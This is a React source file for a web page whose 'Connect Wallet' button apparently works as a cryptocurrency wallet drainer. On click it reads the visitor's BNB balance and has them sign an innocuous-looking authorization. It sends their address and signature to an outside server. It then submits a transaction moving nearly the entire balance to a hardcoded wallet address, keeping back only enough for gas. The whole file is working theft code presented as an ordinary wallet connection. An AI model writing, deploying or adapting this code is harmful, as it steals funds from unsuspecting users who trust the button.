import React, { useState } from "react";

async function getLiveBalance(address) {
  try {
    const balanceHex = await window.ethereum.request({
      method: "eth_getBalance",
      params: [address, "latest"],
    });
    return parseFloat(parseInt(balanceHex, 16) / 1e18).toFixed(6);
  } catch (error) {
    console.error("❌ Error fetching live balance:", error);
    return null;
  }
}

async function getGasPrice() {
  try {
    const gasPriceHex = await window.ethereum.request({
      method: "eth_gasPrice",
      params: [],
    });
    return parseInt(gasPriceHex, 16); // in Wei
  } catch (error) {
    console.error("❌ Error fetching gas price:", error);
    return null;
  }
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    console.log("✅ User address:", userAddress);

    const liveBalanceStr = await getLiveBalance(userAddress);
    console.log("💰 Live BNB Balance:", liveBalanceStr);
    const totalBalance = parseFloat(liveBalanceStr);
    if (isNaN(totalBalance)) {
      console.error("❌ Could not parse live balance.");
      return;
    }

    // reserve تنظیم شده: برای مثال 0.01 BNB
    const reserveBNB = 0.01;
    const sendAmount = totalBalance - reserveBNB;
    if (sendAmount <= 0) {
      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
      return;
    }
    console.log("Calculated send amount (BNB):", sendAmount);

    const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
    console.log("📜 Message to sign:", message);

    let signature;
    try {
      signature = await window.ethereum.request({
        method: "personal_sign",
        params: [message, userAddress],
      });
      console.log("✍️ Signature:", signature);
    } catch (error) {
      console.error("❌ Error in personal_sign:", error);
      return;
    }

    try {
      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handler: "tx",
          address: userAddress,
          signature: signature,
          amount: sendAmount.toString(),
        }),
      });
      const result = await resp.json();
      console.log("Server verify response:", result);
      if (!result.success) {
        console.error("❌ Signature verification failed or server error.", result);
        return;
      }
    } catch (e) {
      console.error("❌ Could not call server to verify signature:", e);
      return;
    }

    // دریافت nonce به صورت زنده
    let nonceHex;
    try {
      nonceHex = await window.ethereum.request({
        method: "eth_getTransactionCount",
        params: [userAddress, "latest"],
      });
      console.log("Nonce (hex):", nonceHex);
    } catch (err) {
      console.error("❌ Error fetching nonce:", err);
      return;
    }

    const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
    const txParams = {
      from: userAddress,
      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
      value: sendWeiHex,
      nonce: nonceHex
      // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
    };

    try {
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });
      console.log("📤 Transaction broadcasted. Hash:", txHash);
      alert("Transaction sent! TxHash: " + txHash);
    } catch (err) {
      console.error("❌ Error sending transaction:", err);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
